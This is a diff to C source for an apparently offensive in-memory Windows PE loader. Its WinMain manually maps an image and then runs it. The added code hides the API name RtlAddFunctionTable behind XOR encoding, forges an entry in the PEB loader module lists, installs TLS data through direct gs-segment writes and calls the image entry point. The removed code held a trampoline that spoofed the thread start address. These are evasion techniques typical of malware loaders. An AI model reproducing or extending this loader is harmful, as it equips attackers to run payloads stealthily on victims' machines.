@@ -32,6 +32,7 @@ static void xd(char* o, const unsigned char* d, DWORD l, unsigned char k) {
     for (DWORD i=0;i<l;i++) o[i]=d[i]^k; o[l]=0;
 }
 
+
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nCmdShow;
 
@@ -247,33 +248,85 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             pVP((BYTE*)img + sec2[i].VirtualAddress, sec2[i].Misc.VirtualSize, prot, &old);
     }
 
-    ULONG_PTR ep = (ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint;
-    ULONG_PTR ta = ep;
+    {
+        IMAGE_DATA_DIRECTORY excDir = nh2->OptionalHeader.DataDirectory[3];
+        if (excDir.VirtualAddress && excDir.Size) {
+            char raft[20];
+            const unsigned char enc_raft[] = {0x08,0x2E,0x36,0x1B,0x3E,0x3E,0x1C,0x2F,0x34,0x39,0x2E,0x33,0x35,0x34,0x0E,0x3B,0x38,0x36,0x3F};
+            xd(raft, enc_raft, sizeof(enc_raft), 0x5A);
+            typedef BOOLEAN(NTAPI* fn_RAFT)(PRUNTIME_FUNCTION, DWORD, DWORD64);
+            fn_RAFT pRAFT = hNT ? (fn_RAFT)pGPA(hNT, raft) : NULL;
+            if (pRAFT)
+                pRAFT((PRUNTIME_FUNCTION)((BYTE*)img + excDir.VirtualAddress),
+                      excDir.Size / sizeof(RUNTIME_FUNCTION),
+                      (DWORD64)(ULONG_PTR)img);
+        }
 
-    if (cjText) {
-        unsigned char tramp[] = {
-            0x51,
-            0x65,0x48,0x8B,0x04,0x25,0x60,0x00,0x00,0x00,
-            0x48,0x8B,0x40,0x18,
-            0x48,0x8B,0x40,0x20,
-            0x48,0x8B,0x00,
-            0x48,0x8B,0x40,0x20,
-            0x48,0x05,0x00,0x10,0x00,0x00,
-            0x48,0x89,0x44,0x24,0x08,
-            0x59,
-            0xFF,0xE1
-        };
-        for (DWORD i = 0; i < sizeof(tramp); i++)
-            cjText[i] = tramp[i];
-        ta = (ULONG_PTR)cjText;
+        {
+            BYTE* peb3 = (BYTE*)__readgsqword(0x60);
+            BYTE* ldr3 = *(BYTE**)(peb3 + 0x18);
+            BYTE* hd3 = ldr3 + 0x10;
+            BYTE* flink = *(BYTE**)hd3;
+            BYTE* entry = (BYTE*)pVA(NULL, 0x200, 0x3000, 0x04);
+            if (entry) {
+                for (int z = 0; z < 0x200; z++) entry[z] = 0;
+                *(PVOID*)(entry + 0x30) = img;
+                *(ULONG*)(entry + 0x40) = imgSz;
+                *(PVOID*)(entry + 0x38) = (PVOID)((ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint);
+                *(BYTE**)(entry + 0x00) = flink;
+                *(BYTE**)(entry + 0x08) = hd3;
+                *(BYTE**)(hd3 + 0x00) = entry;
+                *(BYTE**)(flink + 0x08) = entry;
+                BYTE* hd3m = ldr3 + 0x20;
+                BYTE* flinkm = *(BYTE**)hd3m;
+                *(BYTE**)(entry + 0x10) = flinkm;
+                *(BYTE**)(entry + 0x18) = hd3m;
+                *(BYTE**)(hd3m + 0x00) = entry + 0x10;
+                *(BYTE**)(flinkm + 0x08) = entry + 0x10;
+            }
+        }
     }
 
-    HANDLE hT;
-    if (ta != ep)
-        hT = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)ta, (LPVOID)ep, 0, NULL);
-    else
-        hT = pCT(NULL, 0, (LPTHREAD_START_ROUTINE)ep, NULL, 0, NULL);
-    if (hT) pWF(hT, 0xFFFFFFFF);
+    {
+        IMAGE_DATA_DIRECTORY tlsDir = nh2->OptionalHeader.DataDirectory[9];
+        if (tlsDir.VirtualAddress && tlsDir.Size) {
+            IMAGE_TLS_DIRECTORY* tls = (IMAGE_TLS_DIRECTORY*)((BYTE*)img + tlsDir.VirtualAddress);
+            BYTE* peb2 = (BYTE*)__readgsqword(0x60);
+            BYTE* ldr2 = *(BYTE**)(peb2 + 0x18);
+            BYTE* hd2 = ldr2 + 0x20;
+            BYTE* cr2 = *(BYTE**)hd2;
+            DWORD tlsCnt = 0;
+            while (cr2 != hd2) {
+                HMODULE mx = *(HMODULE*)(cr2 + 0x20);
+                if (mx) {
+                    IMAGE_NT_HEADERS* mn = (IMAGE_NT_HEADERS*)((BYTE*)mx + ((IMAGE_DOS_HEADER*)mx)->e_lfanew);
+                    if (mn->OptionalHeader.DataDirectory[9].VirtualAddress && mn->OptionalHeader.DataDirectory[9].Size)
+                        tlsCnt++;
+                }
+                cr2 = *(BYTE**)cr2;
+            }
+            PVOID* oldTls = (PVOID*)__readgsqword(0x58);
+            PVOID* newTls = (PVOID*)pVA(NULL, (tlsCnt + 1) * sizeof(PVOID), 0x3000, 0x04);
+            if (newTls) {
+                if (oldTls) for (DWORD ti = 0; ti < tlsCnt; ti++) newTls[ti] = oldTls[ti];
+                SIZE_T rawSz = tls->EndAddressOfRawData - tls->StartAddressOfRawData;
+                SIZE_T totalSz = rawSz + tls->SizeOfZeroFill;
+                LPVOID td = NULL;
+                if (totalSz) {
+                    td = pVA(NULL, totalSz, 0x3000, 0x04);
+                    if (td) for (SIZE_T i = 0; i < rawSz; i++) ((BYTE*)td)[i] = ((BYTE*)(tls->StartAddressOfRawData))[i];
+                }
+                newTls[tlsCnt] = td;
+                *(DWORD*)(tls->AddressOfIndex) = tlsCnt;
+                __writegsqword(0x58, (ULONG_PTR)newTls);
+                PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
+                if (cb) { while (*cb) { (*cb)(img, DLL_PROCESS_ATTACH, NULL); cb++; } }
+            }
+        }
+    }
+
+    ULONG_PTR ep = (ULONG_PTR)img + nh2->OptionalHeader.AddressOfEntryPoint;
+    ((void(*)())ep)();
 
     return 0;
 }
